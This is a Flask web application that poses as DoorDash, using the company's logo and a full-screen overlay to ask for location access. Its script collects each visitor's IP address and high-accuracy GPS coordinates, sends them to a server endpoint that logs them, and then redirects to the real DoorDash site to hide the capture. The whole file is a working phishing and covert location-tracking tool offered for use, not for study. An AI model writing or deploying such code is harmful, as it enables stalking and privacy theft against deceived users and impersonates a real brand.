from flask import Flask, request, jsonify, redirect
import logging
from datetime import datetime
import os
import json

app = Flask(__name__)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger('gps_logger')

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Location Service</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <style>
        .body {{
            font-family: -apple-system, BlinkMacSystemFont, 
            "Segoe UI", Roboto, Helvetica, Arial, 
            sans-serif, "Apple Color Emoji";
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
}}
        .gps-overlay {{
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        }}
        .gps-modal {{
            background: white;
            padding: 25px;
            border-radius: 10px;
            max-width: 400px;
            text-align: center;
        }}
        .gps-btn {{
            background: #FF3008;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 15px;
            font-weight: bold;
        }}
    </style>
</head>
<body>
    <!-- Your existing content -->
    {existing_content}
    
    <!-- GPS Permission Overlay -->
    <div class="gps-overlay">
        <div class="gps-modal">
            <img src="https://cdn.doordash.com/managed/consumer/seo/doordash_seo_desktop.png" width="120" alt="DoorDash">
            <h2>DoorDash needs your location to find restaurants near you</h2>
            <p>Please allow location access to continue to DoorDash.com</p>
            <button class="gps-btn" id="gps-allow-btn">Allow Location Access</button>
        </div>
    </div>

    <script>
        async function sendDataAndRedirect(locationData) {{
            try {{
                // Send data to server
                const response = await fetch('/log_location', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(locationData)
                }});
                
                if (response.ok) {{
                    // Redirect to DoorDash after successful logging
                    window.location.href = "https://www.doordash.com";
                }} else {{
                    alert("Error processing your request. Please try again.");
                }}
            }} catch (error) {{
                console.error('Error:', error);
                alert("An error occurred. Please try again.");
            }}
        }}

        document.getElementById('gps-allow-btn').addEventListener('click', async () => {{
            try {{
                // Get client IP first
                const clientIp = await fetch('/getip').then(r => r.text());
                
                // Log permission request
                await sendDataAndRedirect({{
                    type: 'permission_request',
                    ip: clientIp,
                    timestamp: new Date().toISOString()
                }});
                
                // Request location
                const position = await new Promise((resolve, reject) => {{
                    navigator.geolocation.getCurrentPosition(resolve, reject, {{
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }});
                }});
                
                // Log location and redirect
                await sendDataAndRedirect({{
                    type: 'location_data',
                    ip: clientIp,
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date().toISOString()
                }});
                
            }} catch (error) {{
                console.error('Location error:', error);
                const clientIp = await fetch('/getip').then(r => r.text());
                await sendDataAndRedirect({{
                    type: 'error',
                    ip: clientIp,
                    error: error.message,
                    timestamp: new Date().toISOString()
                }});
                alert("Location access is required to continue to DoorDash.");
            }}
        }});
    </script>
</body>
</html>
"""

@app.route('/')
def serve_page():
    """Serve the page with GPS overlay"""
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'unknown')
    
    logger.info(f"Page accessed - IP: {client_ip}, User Agent: {user_agent}")
    
    with open('page.html', 'r') as f:
        existing_content = f.read()
    
    return HTML_TEMPLATE.format(existing_content=existing_content)

@app.route('/getip')
def get_ip():
    """Endpoint to get client IP"""
    return request.headers.get('X-Forwarded-For', request.remote_addr)

@app.route('/log_location', methods=['POST'])
def log_location():
    """Endpoint to log location data"""
    data = request.json
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    log_entry = {
        'timestamp': datetime.utcnow().isoformat(),
        'client_ip': client_ip,
        'event_data': data
    }
    
    logger.info(json.dumps(log_entry, indent=2))
    
    # Additional processing can be done here if needed
    return jsonify({'status': 'success'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
